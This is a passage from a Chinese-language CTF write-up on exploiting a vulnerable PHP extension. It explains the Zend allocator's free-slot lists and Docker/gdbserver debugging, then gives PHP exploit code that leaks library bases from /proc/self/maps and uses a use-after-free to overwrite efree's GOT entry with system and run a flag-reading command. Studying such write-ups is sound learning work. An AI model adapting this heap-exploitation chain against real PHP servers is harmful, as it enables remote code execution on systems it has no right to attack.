
```c
static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_STAT
    //获取页之类的操作？ 给整个heap管理结构体更新信息
    do {
        size_t size = heap->size + bin_data_size[bin_num];
        size_t peak = MAX(heap->peak, size);
        heap->size = size;
        heap->peak = peak;
    } while (0);
#endif
    // 如果free_list里有东西，直接取出来，更新free_list
    if (EXPECTED(heap->free_slot[bin_num] != NULL)) {
        zend_mm_free_slot *p = heap->free_slot[bin_num];
        heap->free_slot[bin_num] = p->next_free_slot;
        return p;
    } else {
        //否则走这边
        return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
}
```

### `zend_mm_alloc_small_slow`

```c
static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
    zend_mm_chunk *chunk;
    int page_num;
    zend_mm_bin *bin;
    zend_mm_free_slot *p, *end;

#if ZEND_DEBUG
    bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num], bin_data_size[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#else
    //申请页内存给到bin
    bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#endif
    if (UNEXPECTED(bin == NULL)) {
        /* insufficient memory */
        return NULL;
    }

    chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);
    page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;
    chunk->map[page_num] = ZEND_MM_SRUN(bin_num);
    if (bin_pages[bin_num] > 1) {
        uint32_t i = 1;

        do {
            chunk->map[page_num+i] = ZEND_MM_NRUN(bin_num, i);
            i++;
        } while (i < bin_pages[bin_num]);
    }

    /* create a linked list of elements from 1 to last */
    //把 bin 从头开始切割成一段段小块，构建一个 free_slot 链表，挂到 heap->free_slot[bin_num] 上。
    end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));
    heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
    do {
        p->next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
#if ZEND_DEBUG
        do {
            zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
            dbg->size = 0;
        } while (0);
#endif
        p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
    } while (p != end);

    /* terminate list using NULL */
    p->next_free_slot = NULL;
#if ZEND_DEBUG
    do {
        zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
        dbg->size = 0;
    } while (0);
#endif

    /* return first element */
    return bin;
}
```

至此`emalloc`的流程大致的解析完毕

### `efree`

```c
ZEND_API void ZEND_FASTCALL _efree(void *ptr ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_CUSTOM
    if (UNEXPECTED(AG(mm_heap)->use_custom_heap)) {
        _efree_custom(ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
        return;
    }
#endif
    zend_mm_free_heap(AG(mm_heap), ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
}
```

和`emalloc`很像，我们直接跟到最后那个函数，看看他如何处理free掉的堆块

### `zend_mm_free_small`

```c
static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num)
{
    zend_mm_free_slot *p;

#if ZEND_MM_STAT
    heap->size -= bin_data_size[bin_num];
#endif

#if ZEND_DEBUG
    do {
        zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
        dbg->size = 0;
    } while (0);
#endif

    p = (zend_mm_free_slot*)ptr;
    p->next_free_slot = heap->free_slot[bin_num];
    heap->free_slot[bin_num] = p;
}
```

总体是十分简洁好看的，就是简单的链表头插

那么我们不难得出一个大体的结论和逻辑

#### `emalloc`

![](https://bbs.kanxue.com/upload/attach/202504/1010243_U995RU2UXZ98V6R.webp)

#### `efree`

直接头插链入freelist

而且好像没有做很多检查和限制，有点像tcache 的逻辑

事实上，我们完全可以把它当作tcache 来攻击

## 8. `gdb` 如何调试

在4. 中提到的端口映射，实际上我们只用将`gdbserver`传入类似共享文件夹中，然后在容器中启动监听，再让主机启动`gdb target remote ip:port`即可调试上

用我们上文写好的启动配置 启动

![](https://bbs.kanxue.com/upload/attach/202504/1010243_CYN4UERWXRBVRJD.webp)

可以清晰看到我们的端口映射关系和启动信息

在主机中访问本地ip，可以看到docker容器中的80端口已经被映射了出来，我们可以访问到这个服务了

![](https://bbs.kanxue.com/upload/attach/202504/1010243_XGZWFEVW2FZRVFH.webp)

### 1）docker容器

我们在docker容器中传入`gdbserver` 并运行

```bash
./gdbserver-7.10.1-x64 :9191 php -S 0:80 exp.php
```

![](https://bbs.kanxue.com/upload/attach/202504/1010243_VPHPPCKHW2BC8C3.webp)

### 2）本机（虚拟机）

直接 `target remote` 本机已经映射好的端口就可以远程调试上了

嫌麻烦的话可以写一个启动脚本

![](https://bbs.kanxue.com/upload/attach/202504/1010243_CTBZQE7A2PYH7GX.webp)

## 9.编写exp

在写之前我们可以看看`vuln.so`的保护

```
[*] '/root/Desktop/pwn/php_master/data/vuln.so'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: PIE enabled
```

got表可写

首先是套板子的介绍，我们打pwn都需要直到各种基址，这样题目中的`vuln`的got表偏移，对于我们而言才有的意义

### 1）获取基址

```php
$map_file = "/proc/self/map";
$system_off = 0x44AF0;
$libc_base = 0;
$vuln_so_base = 0;
$efree_got = 0x4060;

function get_so_base($buffer){
    global $libc_base;
    global $vuln_so_base;
    $libc_line_regex = "/([0-9a-f]+)-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2\.28\.so/";
    $vuln_so_line_regex = "/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-[0-9]+\/vuln\.so/";
    if (preg_match_all($libc_line_regex, $buffer, $matches))
        $libc_base = hexdec($matches[1][0]);
    else
        echo "Failed to get libc base";
    if (preg_match_all($vuln_so_line_regex, $buffer, $matches))
        $vuln_so_base = hexdec($matches[1][0]);
    else
        echo "Failed to get vuln.so base";
}

ob_start();
include "/proc/self/maps";
$buffer = ob_get_contents();
ob_end_flush();
get_so_base($buffer);
$efree_got += $vuln_so_base;

echo "libc base address: " . dechex($libc_base) . "\n<br>";
echo "vuln.so base address: " . dechex($vuln_so_base) . "\n<br>";
echo "_efree.got: " . dechex($efree_got) . "\n<br>";
```

只要没有禁用我们的读写权限，就可以读出基址

否则还是走老路，找一些show的函数，泄露基址

### 2）uaf利用

```php
construct(0x10);
allocate(0,0x30);
allocate(1,0x30);
clear();
overwrite(1,p64($efree_got));
# 这里再初始化一次确保init为1 否则无法allocate
construct(0x10);

allocate(0,0x30);
allocate(1,0x30);

overwrite(0,"/readflag>/var/www/html/flag\x00");

overwrite(1,p64($libc_base + $system_off));
clear();
```

### 3）调试

由yaml文件，我们的

```yaml
# 版本号

version: '3'

#启动的服务

services:

#服务名

  php-master:

  #镜像

    image: php-master:attachment-v1

    #映射的端口，

    ports:

      - "80:80"      # 用于映射上传服务

      - "28888:9191" # 将主机的28888端口映射到容器中的9191端口 用于gdbserver本地连容器

      - "1111:8080"  # 用于触发exp.php 调试

    #文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中

    volumes:

      - ./data:/var/www/html/exp
```

用上文所讲的方法就可以连接到容器的`gdbserver`
